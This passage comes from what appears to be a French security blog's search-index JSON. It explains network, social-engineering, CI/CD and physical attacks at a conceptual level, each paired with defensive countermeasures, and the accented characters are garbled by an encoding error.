privil√©gient parfois les d√©p√¥ts publics. Pas de contr√¥le explicite de la source. 5. Contre-mesures ‚úÖ Verrouillage des sources Configurer le projet pour n‚Äôutiliser que le registre interne. Pourquoi √ßa prot√®ge : √©vite d‚Äôaller chercher un package externe par erreur. ‚úÖ Pinning des versions D√©finir explicitement la version et la source du package. Pourquoi √ßa prot√®ge : emp√™che l‚Äôinstallation d‚Äôune version malveillante. ‚úÖ Surveillance des noms de packages D√©tecter si un package interne appara√Æt sur un d√©p√¥t public. Pourquoi √ßa prot√®ge : alerte imm√©diatement sur une tentative de dependency confusion. 28. Attaques sur les runners CI/CD (Jenkins, GitLab, GitHub Actions) 1. Situation de d√©part Une entreprise utilise des runners CI/CD partag√©s (multi-projets).\n2. Ce que fait l‚Äôattaquant Il lance un job malveillant sur un runner. Il acc√®de aux caches, workspaces ou credentials utilis√©s par d‚Äôautres jobs. 3. Cons√©quence Vol de secrets d‚Äôautres projets. Compromission des artefacts de build. 4. Pourquoi c‚Äôest possible Runners partag√©s entre plusieurs projets/√©quipes. Isolation insuffisante (m√™me utilisateur syst√®me, m√™me VM). 5. Contre-mesures ‚úÖ Isolation des runners Utiliser un runner d√©di√© par projet ou √©quipe. Pourquoi √ßa prot√®ge : emp√™che les fuites inter-projets. ‚úÖ Conteneurisation des jobs Chaque build doit s‚Äôex√©cuter dans un conteneur jetable. Pourquoi √ßa prot√®ge : r√©duit les contaminations entre jobs. ‚úÖ Nettoyage automatique Effacer caches et artefacts apr√®s chaque build. Pourquoi √ßa prot√®ge : emp√™che un attaquant de r√©utiliser des restes d‚Äôex√©cution. Conclusion Les attaques sur les syst√®mes repr√©sentent une des menaces les plus critiques, car elles visent le socle m√™me de l‚Äôinfrastructure : postes, serveurs, cloud, conteneurs.\nElles vont de techniques tr√®s visibles (malwares, ransomwares) √† des approches beaucoup plus furtives (rootkits, fileless malware, persistance firmware).\nLeur gravit√© vient du fait qu‚Äôune fois le syst√®me compromis, toutes les couches sup√©rieures (applications, donn√©es, identit√©s) deviennent accessibles √† l‚Äôattaquant.\nTrois grands axes se d√©gagent :\nPersistance ‚Üí l‚Äôattaquant cherche √† rester invisible le plus longtemps possible. Escalade ‚Üí un compte limit√© devient un acc√®s administrateur complet. Cha√Æne d‚Äôapprovisionnement ‚Üí un seul point faible (d√©pendance, pipeline CI/CD) peut compromettre des milliers de syst√®mes. La d√©fense repose donc sur une strat√©gie combin√©e :\nPr√©vention (patch management, moindre privil√®ge, durcissement), D√©tection (EDR, logs, surveillance des anomalies), R√©action (proc√©dures de r√©installation propre, restauration via sauvegardes immuables). En r√©sum√©, s√©curiser un syst√®me ne se limite pas √† installer un antivirus : c‚Äôest un travail continu d‚Äôhygi√®ne, de vigilance et de r√©silience face √† des adversaires toujours plus cr√©atifs.\n","permalink":"http://localhost:1313/blog/attaques-systemes/","summary":"Des malwares aux attaques sur la cha√Æne CI/CD : d√©couvrez les principales menaces qui visent le c≈ìur des syst√®mes informatiques et les meilleures pratiques pour s‚Äôen prot√©ger.","title":"‚öôÔ∏è Attaques sur les syst√®mes : comprendre et pr√©venir"},{"content":"Attaques R√©seau Les attaques r√©seau ciblent les communications entre machines, services et utilisateurs.\nElles exploitent les faiblesses des protocoles (ARP, DNS, BGP‚Ä¶), l‚Äôabsence de chiffrement ou la confiance implicite entre √©quipements pour intercepter, modifier ou perturber le trafic.\nElles peuvent √™tre passives (sniffing, √©coute), actives (MITM, spoofing) ou massives (DoS/DDoS, hijacking). Leur point commun est de s‚Äôattaquer √† la circulation des donn√©es, qu‚Äôil s‚Äôagisse de voler des identifiants, d√©tourner une connexion ou rendre un service indisponible.\nComprendre ces attaques est essentiel pour appliquer des contre-mesures efficaces : chiffrement bout √† bout, segmentation r√©seau, surveillance des protocoles, et adoption de standards s√©curis√©s comme DNSSEC, WPA3 ou RPKI.\n1. Sniffing (√©coute r√©seau) 1. Situation de d√©part Un utilisateur se connecte √† un r√©seau partag√© (Wi-Fi public, hub).\nLe trafic circule en clair (HTTP, FTP, Telnet).\n2. Ce que fait l‚Äôattaquant Il met sa carte r√©seau en mode ‚Äúpromiscuous‚Äù et capture tout ce qui passe.\nLes paquets contiennent des identifiants, mails, formulaires.\n3. Cons√©quence L‚Äôattaquant peut lire directement des mots de passe ou donn√©es sensibles.\n4. Pourquoi c‚Äôest possible Certains protocoles ne chiffrent pas les donn√©es. Sur des r√©seaux partag√©s, plusieurs machines peuvent voir le m√™me trafic. 5. Contre-mesures üîí Chiffrement bout √† bout (HTTPS, TLS, SSH) Comment √ßa marche : les donn√©es sont chiffr√©es c√¥t√© client et d√©chiffr√©es uniquement c√¥t√© serveur. Pourquoi √ßa prot√®ge : m√™me si l‚Äôattaquant intercepte les paquets, il ne voit que du texte illisible. üì∂ Wi-Fi s√©curis√© (WPA2/WPA3) Comment √ßa marche : chaque client obtient une cl√© de session unique apr√®s authentification. Pourquoi √ßa prot√®ge : un attaquant qui ‚Äú√©coute‚Äù n‚Äôa pas la cl√© et ne peut pas d√©chiffrer le trafic. üåê VPN Comment √ßa marche : chiffre tout le trafic de la machine avant de le faire sortir sur Internet. Pourquoi √ßa prot√®ge : m√™me si le Wi-Fi est compromis, le contenu reste cach√©. 2. Man-in-the-Middle \u0026ldquo;MITM\u0026rdquo; via ARP Spoofing (usurpation ) 1. Situation de d√©part Un PC communique avec Internet via une passerelle.\nLe protocole ARP g√®re l‚Äôassociation IP ‚Üî PC.\n2. Ce que fait l‚Äôattaquant Il envoie de fausses r√©ponses ARP :\nau PC : ‚Äúla passerelle, c‚Äôest moi‚Äù √† la passerelle : ‚Äúle PC, c‚Äôest moi‚Äù\nR√©sultat : tout le trafic passe par lui. 3. Cons√©quence Espionnage, modification, coupure de connexion. 4. Pourquoi c‚Äôest possible ARP ne v√©rifie pas l‚Äôidentit√© des annonces. Les LAN ne bloquent pas par d√©faut ces faux messages. 5. Contre-mesures üîí TLS / HTTPS Emp√™che l‚Äôattaquant de lire/modifier les donn√©es m√™me s‚Äôil les intercepte. üõ°Ô∏è Dynamic ARP Inspection (DAI) V√©rifie chaque r√©ponse ARP sur le switch. Les annonces falsifi√©es sont rejet√©es. üß© Segmentation r√©seau (VLAN) S√©pare les utilisateurs en zones distinctes. Un attaquant invit√© ne peut pas intercepter le trafic interne. üåê VPN Chiffre le trafic d√®s la sortie du PC. L‚Äôattaquant voit passer les paquets, mais ils sont illisibles. 3. IP Spoofing (Usurpation d\u0026rsquo;adresse IP) 1. Situation de d√©part Un serveur re√ßoit du trafic IP.\n2. Ce que fait l‚Äôattaquant Il falsifie l‚Äôadresse IP source dans ses paquets.\nLe serveur croit recevoir du trafic d‚Äôun h√¥te l√©gitime.\n3. Cons√©quence D√©tournement de session TCP vuln√©rable. Amplification d‚Äôattaques DDoS. 4. Pourquoi c‚Äôest possible Le champ ‚ÄúIP source‚Äù n‚Äôest pas authentifi√©. Les routeurs acceptent souvent les paquets sans contr√¥le. 5. Contre-mesures üõë Filtrage anti-spoofing (BCP 38) Les routeurs v√©rifient que les paquets sortants appartiennent bien au sous-r√©seau local. Les paquets usurp√©s sont bloqu√©s d√®s leur sortie. üîí Protocoles avec authentification (TLS, VPN) Un paquet peut pr√©tendre venir d‚Äôune IP, mais sans les bons certificats, il n‚Äôest pas accept√©. üîç IDS/IPS D√©tectent incoh√©rences entre IP source et chemin r√©seau (ex. IP cens√©e venir de France mais en r√©alit√© capt√©e en Asie). 4. Denial of Service (DoS / DDoS) 1. Situation de d√©part Un site web est en ligne, expos√© √† tous.\n2. Ce que fait l‚Äôattaquant Il envoie un volume √©norme de requ√™tes via un botnet.\nLe serveur ne peut pas traiter le flux.\n3. Cons√©quence Le service devient indisponible.\n4. Pourquoi c‚Äôest possible Les serveurs ont des ressources limit√©es. Les protocoles (HTTP, TCP) traitent toute requ√™te comme honn√™te. 5. Contre-mesures ‚òÅÔ∏è CDN / Anycast R√©partit les requ√™tes sur plusieurs serveurs g√©ographiquement dispers√©s. Pourquoi √ßa prot√®ge : le trafic est dilu√©, aucun serveur n‚Äôest satur√©. üö¶ Rate limiting Bloque ou ralentit une IP apr√®s X requ√™tes/s. Pourquoi √ßa prot√®ge : r√©duit l‚Äôimpact d‚Äôun attaquant isol√©, force le botnet √† se disperser. üß± Firewalls anti-DDoS Filtrent les paquets suspects (ex. requ√™tes incompl√®tes). Pourquoi √ßa prot√®ge : le serveur final re√ßoit uniquement du trafic ‚Äúvalide‚Äù. 5. DNS Spoofing / Cache Poisoning (Empoisonnement du cache DNS) 1. Situation de d√©part Un utilisateur demande l‚ÄôIP de banque.fr √† un r√©solveur DNS.\n2. Ce que fait l‚Äôattaquant Il envoie une fausse r√©ponse DNS avec une IP malveillante.\nLe r√©solveur met cette IP en cache.\n3. Cons√©quence L‚Äôutilisateur est redirig√© vers un faux site (phishing).\n4. Pourquoi c‚Äôest possible DNS classique ne v√©rifie pas la l√©gitimit√© des r√©ponses. Le r√©solveur fait confiance √† la premi√®re r√©ponse re√ßue. 5. Contre-mesures üîë DNSSEC Chaque r√©ponse DNS est sign√©e cryptographiquement. Pourquoi √ßa prot√®ge : le r√©solveur rejette les r√©ponses non sign√©es ou modifi√©es. üõ°Ô∏è R√©solveurs fiables Google DNS, Cloudflare ou Quad9 appliquent des protections renforc√©es. Pourquoi √ßa prot√®ge : moins expos√©s aux empoisonnements que de petits serveurs. üîç Monitoring DNS D√©tecter anomalies : un domaine soudain pointant vers une IP √©trang√®re. 6. DHCP Spoofing (Dynamic Host Configuration Protocol) 1. Situation de d√©part Un client demande sa config IP √† un serveur DHCP.\n2. Ce que fait l‚Äôattaquant Il se fait passer pour un serveur DHCP et r√©pond plus vite.\nIl attribue de fausses infos (ex. passerelle = machine de l‚Äôattaquant).\n3. Cons√©quence Tout le trafic du client passe par l‚Äôattaquant.\n4. Pourquoi c‚Äôest possible DHCP fait confiance √† toute r√©ponse re√ßue. Aucun m√©canisme d‚Äôauthentification. 5. Contre-mesures üîí DHCP Snooping Le switch surveille les r√©ponses DHCP. Seuls les ports ‚Äúautoris√©s‚Äù peuvent agir comme serveur DHCP. Pourquoi √ßa prot√®ge : le faux serveur est bloqu√©. üß© Segmentation r√©seau Isoler les r√©seaux clients et serveurs. Pourquoi √ßa prot√®ge : l‚Äôattaquant n‚Äôest pas sur le m√™me segment. 7. BGP Hijacking (d√©tournement IP/prefix/route) 1. Situation de d√©part Les op√©rateurs utilisent BGP pour annoncer les routes IP.\n2. Ce que fait l‚Äôattaquant Il annonce une route plus sp√©cifique que la l√©gitime.\nLe trafic mondial est redirig√© vers lui.\n3. Cons√©quence Interception de trafic √† grande √©chelle. Coupure de services. 4. Pourquoi c‚Äôest possible BGP fonctionne sur la confiance entre op√©rateurs. Pas d‚Äôauthentification native. 5. Contre-mesures üîë RPKI (Resource Public Key Infrastructure) Chaque route annonc√©e est sign√©e et v√©rifiable. Pourquoi √ßa prot√®ge : les fausses annonces sont rejet√©es. üîç Monitoring BGP Outils comme RIPE RIS ou MANRS surveillent les annonces anormales. Pourquoi √ßa prot√®ge : permet de r√©agir rapidement. üìè Filtrage strict Les op√©rateurs filtrent les routes de leurs clients. Pourquoi √ßa prot√®ge : un client ne peut pas annoncer un pr√©fixe qui ne lui appartient pas. 8. Attaques Wi-Fi (Evil Twin) 1. Situation de d√©part Un utilisateur cherche √† se connecter √† un Wi-Fi public.\n2. Ce que fait l‚Äôattaquant Il cr√©e un point d‚Äôacc√®s avec le m√™me SSID (nom) qu‚Äôun r√©seau l√©gitime.\nL‚Äôutilisateur s‚Äôy connecte automatiquement.\n3. Cons√©quence Tout le trafic passe par l‚Äôattaquant.\n4. Pourquoi c‚Äôest possible Les clients Wi-Fi font confiance aux SSID connus. Pas de v√©rification que le point d‚Äôacc√®s est ‚Äúle vrai‚Äù. 5. Contre-mesures üîí WPA3-Enterprise Authentification forte avec certificats. Pourquoi √ßa prot√®ge : impossible pour l‚Äôattaquant de se faire passer pour le vrai r√©seau sans les bons certificats. üì∂ D√©sactiver la reconnexion automatique Forcer l‚Äôutilisateur √† choisir manuellement le r√©seau. Pourquoi √ßa prot√®ge : l‚Äôordi ne saute pas automatiquement sur le faux AP. üåê VPN Le trafic est chiffr√© d√®s le d√©part. Pourquoi √ßa prot√®ge : m√™me sur un AP malveillant, les donn√©es restent illisibles. üîç WIDS (Wireless Intrusion Detection System) Surveille l‚Äôair et d√©tecte les SSID suspects. Pourquoi √ßa prot√®ge : alerte si un ‚Äúclone‚Äù du r√©seau appara√Æt. Conclusion Les attaques r√©seau illustrent √† quel point l‚ÄôInternet repose sur la confiance entre √©quipements et protocoles. Une simple absence de chiffrement ou de v√©rification d‚Äôidentit√© permet √† un attaquant d‚Äôintercepter ou de manipuler des communications sensibles.\nTrois axes majeurs ressortent :\nConfidentialit√© ‚Üí prot√©ger les √©changes par du chiffrement (TLS, VPN, WPA3). Int√©grit√© ‚Üí emp√™cher la modification ou l‚Äôusurpation (DNSSEC, DAI, RPKI). Disponibilit√© ‚Üí r√©sister aux saturations massives (CDN, filtrage anti-DDoS). En r√©sum√©, s√©curiser les r√©seaux ne se limite pas √† d√©ployer des firewalls : il s‚Äôagit d‚Äôun ensemble de pratiques combinant protocoles robustes, supervision active et conception r√©siliente des infrastructures.\n","permalink":"http://localhost:1313/blog/attaques-reseaux/","summary":"Sniffing, MITM, DDoS, DNS spoofing, BGP hijacking : d√©couvrez les attaques qui visent directement la circulation des donn√©es et les solutions pour prot√©ger vos r√©seaux.","title":"üåê Attaques R√©seau : comprendre et se prot√©ger"},{"content":"Attaques sur l‚Äôidentit√© et l‚Äôhumain (Ing√©nierie sociale) Les attaques sur l‚Äôidentit√© et l‚Äôhumain ne reposent pas sur une faille technique, mais sur les faiblesses psychologiques et comportementales.\nL‚Äôattaquant exploite la confiance, la curiosit√©, la peur, la politesse ou l‚Äôautorit√© pour obtenir des informations sensibles, pousser une action non voulue ou acc√©der √† un syst√®me.\nElles se d√©clinent sous de nombreuses formes : emails frauduleux (phishing, spear phishing), appels t√©l√©phoniques (vishing), SMS (smishing), faux supports techniques, ou encore intrusion physique (tailgating, dumpster diving, shoulder surfing).\nLeur efficacit√© repose sur un point central : l‚Äôhumain est souvent le maillon le plus faible de la s√©curit√©.\n1. Phishing 1. Situation de d√©part Un utilisateur re√ßoit un email semblant venir de sa banque :\n‚ÄúVotre compte est bloqu√©, cliquez ici pour r√©activer‚Äù.\n2. Ce que fait l‚Äôattaquant Le mail contient un lien vers un faux site imitant le vrai. L‚Äôutilisateur entre ses identifiants de connexion. 3. Cons√©quence Vol des identifiants. Acc√®s ill√©gitime au compte bancaire. 4. Pourquoi c‚Äôest possible Les emails peuvent facilement usurper une identit√© visuelle. Les utilisateurs font confiance √† ce qu‚Äôils reconnaissent (logo, style). 5. Contre-mesures ‚úÖ Formation des utilisateurs Expliquer comment rep√©rer les signaux (URL diff√©rente, fautes d‚Äôorthographe). Pourquoi √ßa prot√®ge : r√©duit les chances que l‚Äôutilisateur tombe dans le pi√®ge. ‚úÖ Authentification forte MFA (SMS, TOTP, cl√© physique). Pourquoi √ßa prot√®ge : m√™me si le mot de passe est vol√©, l‚Äôacc√®s reste bloqu√©. ‚úÖ Filtres anti-phishing Passerelles mail avec d√©tection d‚ÄôURL suspectes. Pourquoi √ßa prot√®ge : bloque ou marque les mails avant qu‚Äôils atteignent l‚Äôutilisateur. 2. Spear Phishing 1. Situation de d√©part Un employ√© re√ßoit un mail personnalis√© :\n‚ÄúBonjour Jean, voici la facture pour le projet X dont vous avez parl√© avec Paul‚Äù.\n2. Ce que fait l‚Äôattaquant Utilise des informations personnelles r√©cup√©r√©es sur LinkedIn ou r√©seaux sociaux. Rend l‚Äôemail cr√©dible et cibl√©. 3. Cons√©quence L‚Äôutilisateur clique ou ouvre la pi√®ce jointe. Vol d‚Äôidentifiants, installation d‚Äôun malware. 4. Pourquoi c‚Äôest possible Les attaquants collectent facilement des infos publiques. Les utilisateurs ne s‚Äôattendent pas √† ce niveau de personnalisation. 5. Contre-mesures ‚úÖ Sensibilisation renforc√©e Expliquer aux employ√©s que m√™me un mail cr√©dible peut √™tre pi√©g√©. Pourquoi √ßa prot√®ge : augmente la vigilance face aux mails personnalis√©s. ‚úÖ V√©rification syst√©matique Avant d‚Äôex√©cuter une demande sensible (paiement, virement), confirmer par t√©l√©phone ou canal diff√©rent. Pourquoi √ßa prot√®ge : emp√™che qu‚Äôun simple mail trompe un employ√©. ‚úÖ DLP et sandbox Scanner les pi√®ces jointes et liens avant ouverture. Pourquoi √ßa prot√®ge : limite l‚Äôex√©cution de malwares via pi√®ces jointes pi√©g√©es. 3. Vishing (Voice Phishing) 1. Situation de d√©part Un employ√© re√ßoit un appel t√©l√©phonique d‚Äôun ‚Äúsupport technique Microsoft‚Äù.\n2. Ce que fait l‚Äôattaquant Il explique que l‚Äôordinateur est infect√©. Il demande √† installer un logiciel de prise en main √† distance. 3. Cons√©quence L‚Äôattaquant prend le contr√¥le du poste. Vol de donn√©es, installation de ransomware. 4. Pourquoi c‚Äôest possible La voix donne une impression de l√©gitimit√© et d‚Äôurgence. Les utilisateurs veulent souvent ‚Äúaider‚Äù ou r√©soudre vite un probl√®me. 5. Contre-mesures ‚úÖ Proc√©dures internes Avoir un canal officiel pour le support technique. Pourquoi √ßa prot√®ge : √©vite de faire confiance √† un appel spontan√©. ‚úÖ Formation √† la reconnaissance Expliquer les signaux d‚Äôalerte (demande d‚Äôinstaller un logiciel, urgence). Pourquoi √ßa prot√®ge : permet √† l‚Äôutilisateur de raccrocher sans culpabilit√©. ‚úÖ Caller ID et filtrage Outils pour identifier et bloquer les num√©ros frauduleux. Pourquoi √ßa prot√®ge : r√©duit la probabilit√© d‚Äôexposition. 4. Smishing (SMS Phishing) 1. Situation de d√©part Un utilisateur re√ßoit un SMS :\n‚ÄúVotre colis est en attente, cliquez ici pour payer 1‚Ç¨ de frais‚Äù.\n2. Ce que fait l‚Äôattaquant Le lien m√®ne √† un faux site de livraison. L‚Äôutilisateur entre ses infos bancaires. 3. Cons√©quence Vol de carte bancaire. Fraudes financi√®res. 4. Pourquoi c‚Äôest possible Les SMS paraissent venir d‚Äôun num√©ro connu (ex. La Poste). Les utilisateurs font confiance aux messages courts et urgents. 5. Contre-mesures ‚úÖ V√©rification hors bande Contacter directement le service concern√© via leur site officiel. Pourquoi √ßa prot√®ge : on √©vite de cliquer sur le lien frauduleux. ‚úÖ Sensibilisation Expliquer que les organismes ne demandent jamais d‚Äôinfos sensibles par SMS. Pourquoi √ßa prot√®ge : l‚Äôutilisateur identifie la fraude plus facilement. ‚úÖ Filtrage op√©rateur Certains op√©rateurs bloquent d√©j√† les SMS suspects. Pourquoi √ßa prot√®ge : r√©duit l‚Äôexposition en amont. 5. Pretexting (usurpation de r√¥le) 1. Situation de d√©part Un attaquant appelle un employ√© en se faisant passer pour le service informatique.\n2. Ce que fait l‚Äôattaquant Il invente un sc√©nario cr√©dible : ‚Äúnous faisons une mise √† jour de s√©curit√©, j‚Äôai besoin de vos identifiants‚Äù. L‚Äôutilisateur, rassur√©, coop√®re. 3. Cons√©quence Vol de mots de passe. Acc√®s direct aux syst√®mes internes. 4. Pourquoi c‚Äôest possible Les humains ont tendance √† faire confiance √† une autorit√© per√ßue. Pas de proc√©dure formelle pour v√©rifier l‚Äôidentit√© du demandeur. 5. Contre-mesures ‚úÖ Proc√©dures d‚Äôauthentification interne Exiger un code interne ou une v√©rification par un autre canal. Pourquoi √ßa prot√®ge : emp√™che qu‚Äôun simple appel suffise. ‚úÖ Sensibilisation √† l‚Äôautorit√© Former les employ√©s √† r√©sister aux pressions d‚Äôautorit√©. Pourquoi √ßa prot√®ge : r√©duit la manipulation psychologique. 6. Quid pro quo 1. Situation de d√©part Un employ√© re√ßoit un appel : ‚ÄúNous offrons une carte cadeau Amazon si vous installez ce logiciel de test‚Äù.\n2. Ce que fait l‚Äôattaquant Il propose un ‚Äúservice‚Äù en √©change d‚Äôune action. L‚Äôutilisateur installe un logiciel malveillant. 3. Cons√©quence Infection du poste. Acc√®s non autoris√© aux syst√®mes internes. 4. Pourquoi c‚Äôest possible Les humains aiment recevoir une r√©compense pour un petit effort. L‚Äôoffre semble anodine. 5. Contre-mesures ‚úÖ Politique stricte d‚Äôinstallation logicielle Interdire toute installation non valid√©e par l‚ÄôIT. Pourquoi √ßa prot√®ge : m√™me si l‚Äôemploy√© est tent√©, l‚Äôinstallation √©choue. ‚úÖ Sensibilisation √† la manipulation Expliquer que ‚Äúcadeaux‚Äù et ‚Äúbonus‚Äù peuvent cacher une attaque. Pourquoi √ßa prot√®ge : l‚Äôutilisateur h√©site avant d‚Äôaccepter. 7. Fraude au pr√©sident (Business Email Compromise) 1. Situation de d√©part Une assistante comptable re√ßoit un mail du ‚ÄúPDG‚Äù de son entreprise :\n‚ÄúJe suis en d√©placement √† l‚Äô√©tranger, c‚Äôest urgent : fais un virement de 50 000 ‚Ç¨ √† ce compte fournisseur‚Äù.\n2. Ce que fait l‚Äôattaquant Le mail imite l‚Äôadresse du PDG (ex. ceo@entreprlse.com avec un ‚Äúl‚Äù remplac√© par un ‚Äúi‚Äù). Il joue sur l‚Äôurgence et l‚Äôautorit√©. Il demande de contourner les proc√©dures habituelles (‚Äúne parle √† personne, c‚Äôest confidentiel‚Äù). 3. Cons√©quence L‚Äôemploy√©e effectue le virement. L‚Äôargent est perdu et difficilement r√©cup√©rable. 4. Pourquoi c‚Äôest possible L‚Äôhumain est sensible √† l‚Äôautorit√© (surtout venant du PDG). Pression du temps ‚Üí absence de v√©rification. Pas de proc√©dure de double validation pour les virements. 5. Contre-mesures ‚úÖ Proc√©dure de validation des paiements Tout virement doit √™tre valid√© par deux personnes. Pourquoi √ßa prot√®ge : emp√™che qu‚Äôune seule personne, manipul√©e, ex√©cute la fraude. ‚úÖ Sensibilisation aux faux emails Montrer des exemples concrets de domaines usurp√©s. Pourquoi √ßa prot√®ge : habitue l‚Äôemploy√© √† v√©rifier attentivement l‚Äôadresse. ‚úÖ Simulation de phishing interne Organiser des tests contr√¥l√©s pour mesurer la r√©action des employ√©s. Pourquoi √ßa prot√®ge : entra√Æne les r√©flexes en conditions r√©alistes. 8. Faux support technique (tech support scam) 1. Situation de d√©part Un employ√© re√ßoit un appel d‚Äôun ‚Äútechnicien Microsoft‚Äù :\n‚ÄúVotre ordinateur envoie des erreurs, nous devons intervenir imm√©diatement‚Äù.\n2. Ce que fait l‚Äôattaquant Il demande √† installer un logiciel de prise de contr√¥le √† distance (ex. TeamViewer). Il affiche volontairement de faux messages d‚Äôerreur pour convaincre la victime. 3. Cons√©quence L‚Äôattaquant prend le contr√¥le complet du poste. Il peut voler des fichiers, installer un ransomware. 4. Pourquoi c‚Äôest possible L‚Äôhumain fait confiance √† une personne qui para√Æt comp√©tente et utilise du jargon technique. Le sentiment d‚Äôurgence emp√™che de r√©fl√©chir. 5. Contre-mesures ‚úÖ Proc√©dures officielles de support Communiquer aux employ√©s le seul canal l√©gitime du support interne. Pourquoi √ßa prot√®ge : ils savent imm√©diatement qu‚Äôun appel externe est suspect. ‚úÖ Limiter les droits d‚Äôadmin Les utilisateurs n‚Äôont pas le droit d‚Äôinstaller des logiciels. Pourquoi √ßa prot√®ge : m√™me si manipul√©, l‚Äôemploy√© ne peut pas donner la main. ‚úÖ Formation par jeux de r√¥le Simuler des appels de faux techniciens lors de formations. Pourquoi √ßa prot√®ge : habitue les utilisateurs √† dire ‚Äúnon‚Äù sans culpabiliser. 9. Tailgating (intrusion physique par suivi) 1. Situation de d√©part Une entreprise utilise un badge pour entrer dans les bureaux.\n2. Ce que fait l‚Äôattaquant Il attend qu‚Äôun employ√© ouvre la porte. Il se glisse derri√®re en tenant un caf√© ou en parlant au t√©l√©phone. L‚Äôemploy√©, par politesse, ne lui demande pas de badger. 3. Cons√©quence L‚Äôattaquant acc√®de physiquement aux bureaux. Vol de mat√©riel, branchement d‚Äôun keylogger, r√©cup√©ration de documents imprim√©s. 4. Pourquoi c‚Äôest possible La politesse et la confiance sont des biais humains forts. Les employ√©s n‚Äôosent pas ‚Äújouer √† la police‚Äù. 5. Contre-mesures ‚úÖ Politique ‚Äúno tailgating‚Äù Former les employ√©s √† fermer les portes derri√®re eux. Pourquoi √ßa prot√®ge : r√©duit la possibilit√© de suivre quelqu‚Äôun sans badge. ‚úÖ Vid√©osurveillance et contr√¥les Cam√©ras et personnel de s√©curit√©. Pourquoi √ßa prot√®ge : dissuade et permet d‚Äôidentifier une intrusion. ‚úÖ Sensibilisation √† l‚Äôing√©nierie sociale physique Expliquer que l‚Äôattaquant utilisera la politesse comme arme. Pourquoi √ßa prot√®ge : d√©culpabilise l‚Äôemploy√© qui ose demander un badge. 10. Dumpster Diving (fouille de poubelles) 1. Situation de d√©part Une entreprise jette ses brouillons, factures ou vieux disques durs sans pr√©caution.\n2. Ce que fait l‚Äôattaquant Il fouille les poubelles ou r√©cup√®re des disques jet√©s. Il y trouve des informations sensibles (num√©ros clients, logins, donn√©es financi√®res). 3. Cons√©quence Vol d‚Äôinformations confidentielles. Pr√©paration d‚Äôattaques cibl√©es (phishing cr√©dible). 4. Pourquoi c‚Äôest possible Les documents ou supports ne sont pas d√©truits correctement. Les employ√©s consid√®rent la poubelle comme ‚Äús√©curis√©e‚Äù. 5. Contre-mesures ‚úÖ Broyeurs de documents D√©truire tous les papiers sensibles avant de les jeter. Pourquoi √ßa prot√®ge : rend la reconstitution impossible. ‚úÖ Effacement s√©curis√© des disques Utiliser des outils de wipe ou destruction physique. Pourquoi √ßa prot√®ge : emp√™che la r√©cup√©ration de donn√©es effac√©es. ‚úÖ Politique de gestion des d√©chets D√©finir clairement quoi jeter, o√π, et comment. Pourquoi √ßa prot√®ge : r√©duit les fuites accidentelles. 11. Shoulder Surfing (observation visuelle) 1. Situation de d√©part Un employ√© travaille dans un caf√© ou un open space.\n2. Ce que fait l‚Äôattaquant Il s‚Äôassoit derri√®re ou √† c√¥t√©. Il observe les mots de passe tap√©s ou lit les infos affich√©es. 3. Cons√©quence Vol d‚Äôidentifiants. Divulgation d‚Äôinformations sensibles. 4. Pourquoi c‚Äôest possible Les √©crans sont visibles par des personnes non autoris√©es. Aucun filtre visuel. 5. Contre-mesures ‚úÖ Filtres de confidentialit√© sur √©crans Limite l‚Äôangle de vision. Pourquoi √ßa prot√®ge : seul l‚Äôutilisateur en face peut lire. ‚úÖ Posture discr√®te Tourner l‚Äô√©cran vers un mur ou un angle discret. Pourquoi √ßa prot√®ge : r√©duit les risques d‚Äôespionnage accidentel. ‚úÖ Sensibilisation Expliquer que l‚Äôespionnage peut √™tre aussi simple qu‚Äôun regard discret. Pourquoi √ßa prot√®ge : incite √† plus de vigilance en public. Conclusion Les attaques d‚Äôing√©nierie sociale rappellent que la s√©curit√© ne d√©pend pas uniquement des machines et des protocoles, mais aussi de la vigilance des personnes.\nEn usurpant une identit√©, en jouant sur l‚Äôurgence ou en exploitant la politesse, un attaquant peut obtenir plus qu‚Äôavec une attaque technique complexe.\nTrois axes majeurs se d√©gagent :\nSensibilisation et formation ‚Üí donner aux utilisateurs les bons r√©flexes. Proc√©dures claires ‚Üí exiger des validations multiples, d√©finir des canaux officiels. Culture de s√©curit√© ‚Üí d√©culpabiliser les employ√©s qui doutent ou refusent une demande suspecte. En r√©sum√©, la d√©fense face √† ces attaques repose moins sur la technologie que sur l‚Äôhygi√®ne comportementale et la maturit√© collective face aux manipulations.\n","permalink":"http://localhost:1313/blog/attaques-identite-humain/","summary":"Les attaques d‚Äôing√©nierie sociale visent l‚Äôhumain plus que la machine. D√©couvrez les principales techniques (phishing, vishing, smishing, fraude au pr√©sident, etc.) et les contre-mesures pour renforcer la vigilance et la culture s√©curit√©.","title":"üë®‚Äçüë®‚Äçüëß‚Äçüë¶ Attaques sur l‚Äôidentit√© et l‚Äôhumain (Ing√©nierie sociale)"},{"content":"Attaques physiques et mat√©rielles Les attaques physiques et mat√©rielles visent directement les √©quipements : ordinateurs, serveurs, p√©riph√©riques, badges, processeurs.\nElles s‚Äôappuient sur un acc√®s physique, temporaire ou permanent, ou exploitent des propri√©t√©s intrins√®ques du mat√©riel (signaux √©lectromagn√©tiques, consommation d‚Äô√©nergie, bus internes).\nContrairement aux attaques r√©seau ou logicielles, elles sont souvent invisibles pour les syst√®mes de d√©tection classiques (antivirus, IDS). Elles peuvent impliquer :\nle vol ou la compromission d‚Äôappareils (laptops, disques, smartphones), l‚Äôinsertion d‚Äôimplants mat√©riels (p√©riph√©riques pi√©g√©s, circuits espions), l‚Äôexploitation de failles micro-architecturales (Spectre, Meltdown, Rowhammer), ou encore des manipulations physiques directes (glitching, sondes √©lectriques, cold boot). Leur danger r√©side dans leur furtivit√© et leur persistance : un implant mat√©riel ou un firmware compromis peut survivre √† toute r√©installation logicielle et donner un acc√®s cach√© durant des ann√©es.\n1. Vol ou perte d‚Äô√©quipements 1. Situation de d√©part Un employ√© travaille avec un laptop contenant des donn√©es sensibles.\nIl le perd dans un train ou il est vol√© dans un caf√©.\n2. Ce que fait l‚Äôattaquant Il acc√®de directement au disque dur. Il copie ou vole les fichiers pr√©sents. 3. Cons√©quence Fuite de donn√©es confidentielles. Usurpation d‚Äôidentit√© (si credentials stock√©s). 4. Pourquoi c‚Äôest possible Le disque n‚Äôest pas chiffr√©. Aucun mot de passe BIOS/UEFI. 5. Contre-mesures ‚úÖ Chiffrement complet du disque (BitLocker, LUKS, FileVault) Les donn√©es sont chiffr√©es au repos. Pourquoi √ßa prot√®ge : m√™me avec un acc√®s physique, impossible de lire le disque sans cl√©. ‚úÖ Authentification forte Mot de passe fort + MFA. Pourquoi √ßa prot√®ge : emp√™che l‚Äôattaquant d‚Äôutiliser directement la session. 